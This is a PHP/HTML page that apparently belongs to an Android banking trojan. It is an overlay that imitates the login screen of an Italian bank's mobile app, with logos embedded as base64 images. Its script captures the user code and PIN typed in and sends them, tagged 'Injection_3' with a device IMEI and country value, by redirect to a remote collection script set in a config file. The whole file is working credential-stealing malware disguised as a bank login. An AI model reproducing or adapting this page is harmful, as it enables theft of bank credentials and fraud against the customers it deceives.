<!-- 4.2 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/it.popso.SCRIGNOapp/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img style="width: 35%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAApCAMAAAAxpCQAAAAC8VBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+uQeGaAAAA+nRSTlMANY2GgIuRghQBhHEIECAcChudLXVAFeTJcNPehZVmBaQLjDOcFsvBpuJIelgSRI9tOgegA7nUdPP+58ApVlB8DlNB/IGhvN/pa5SHZfcmEe/wCe1XiC/63LACveEP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">
    </div>

    <p>WELCOME</p>
    <form action="null" method="post" id="_mainForm" target="flow_handler">
        <input type="tel" class="field" name="login" id="login" placeholder="User code">

        <input type="password" class="field" name="pin" id="pin" placeholder="PIN">

        <input type="submit" class="button" id="input_submitBtn" value="LOGIN">
    </form>

    <div class="form-bottom">
        Privace Mode
        <img style="float: right;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADUAAAAhCAIAAAD2w3SqAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QzM4RkFEMjBCNzgzMTFFOEFGNjFFNTUwRUY0OEJFRDQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QzM4RkFEMjFCNzgzMTFFOEFGNjFFNTUwRUY0OEJFRDQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpDMzhGQUQxRUI3ODMxMUU4QUY2MUU1NTBFRjQ4QkVENCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpDMzhGQUQxRkI3ODMxMUU4QUY2MUU1NTBFRjQ4QkVENCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PpT7ikQAAATzSURBVHjatJhLbxtVFMfvY2b8Go9fdZz0kYSkKlFESZNQgaARLGCDxLJixZKu2PERWPMZ2KEIpZSKSiAqEEmIKHWL5DSgKmqF80BJ7Aa/x/bcufdyZtwm0EZOPLaPFcUZT879+Zxz//ecwW//kEZtTErnR6JTFI2qNE5wAGO40vqQEIKw+0LYuey8OcbgP2tC5rn4i/Eil8fer7Qne0Ulr/voEBIByTm3nIuHPjFBRFGooqiUAirBrqETG/BtML5ksnWLd8Lnkk1p5F0fjXFWr1UUVUkMpiIRIxAIKIoCDLbN6/V6pVLZ3c2Vy+VAIOjz+VTVAXVjeSLKKMVRqkz5FaC8VWEPLfvFe/Dz+ZUygNGHIXoB2ZVKNRaLjI+/lEjE2yxTKpUeP87m8/uhUKj1BSCUJ8n1c3n/rc6+LDVlOz4pByi+plOlbjJmXbp0MZk8dcIFCoViJrMmhNR1XdM0Sinq3J5w8fl+vSrkUXxSpij+RKdWtaxp6tzcmx4WSKfvFwrlSCQC6faGWJfys7xZeYZIDuBCGH2sE4AD197gwC5fnk0mE6VS0bIsIYQHD6APnyYC2rMKfsoHf10NKZBWuH7lyhuoC5ueftUwdNg6ts2k9IKYoOSDsIYP+aSc9pELiNVqtbm5t1DXBlFsNmF/1zkXjnh2bu8E1RGVHsRPvufD8I3HxkZUVemeDypvaupiqVRmjHnjA7tq+Fw+KV/z0bBtgf5OTLyMemRnzpwGnWk06lCF3hCHVTKuOXKKplVsmubZs6c7Uv9jbXJyAgrGtm2EPIZw1q+AkspzWICjsbFR1FMbGEhWq7VuUuzwTaiUcBsED3S1t3ygU7oebPF5QwwSTEZUApUHior6YKnUAORXCOnZA0kquHUo9YMvHo+5KtgFH3UPcshvP/ggxW78hHc+8fR4k/3g+4+4ePRPqtwhbDQa/eAD2fLWbh3y7bhNdrFY6gdfPp+nFPpZ4j2/j5ocWvMnT/Z7nmJwuLW17XbU3o3khKxiAr52dnZ6y+eevxymE2eM8mS7toABDGcFgQFiff1Rb/m2t7eDwSAoQ6dz04H9ajKndFcs0L/Q5uaWZbFewYGspNO/g6xC/Dwf6xmoPfj1t0QbVAuF9MXFpV7xZTIPYFyC+MH+9eZh2WT73M0v2HdNHIlGd3f3stls93C5XG5t7Y9oNOr3+1tjccfCidD3VeugP8U5RH6WaiwWX1z8pVqtdgMHbfPt2z9FozFdD0NyvSnfF8VG2T21XT43hCs22fRDwYSvX/8G+iKvcI2bN2+pqgZ8bvCIh+AtmizTsP8/v2EsCb3B6L4Rg0Kcn/8KpKtTv3t7uYWFr0GNk8kkFJ+iUA9w6Qa7UT6c0unoR9cOEAXGf9poKOAbUujq6gM4nQYHB2GZE+xWfu/e/eXlFcMwksmBcDgMIexU9oBpyWTzpaZo+3xDCJvPYDYnGvXCPzDJzs7OnD8/Fo/HX1wPVL1YLGazG3fu3IWoJxIJw4i09myncAUuFsrWatM+7vlLa1nOsc3eV/lw07QrZRjtIFHDw+dSqRQoJdxSq5mwSTc3N6F7gpKNRIxw2AA90TTnsUFHaS0JebfOvq1YRx6v+Ojnf62OHNojZk0ie4bY0KdTbmNuc7dfBwhN0yBOfn8ADPq81jOXY48KgIB9aSHZEGjPFj+a1sMmb3P/vwIMABaBZHitxGKCAAAAAElFTkSuQmCC">
    </div>

    <div class="icons">
        <img src="data:image/png;base64,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">
        <img style="float: right;" src="data:image/png;base64,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">
    </div>

    <div class="footer">
        Banca Popolare di Sandrio - PJVA 00053810149
    </div>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('pin');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|it_scrigno|"+oNumInp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
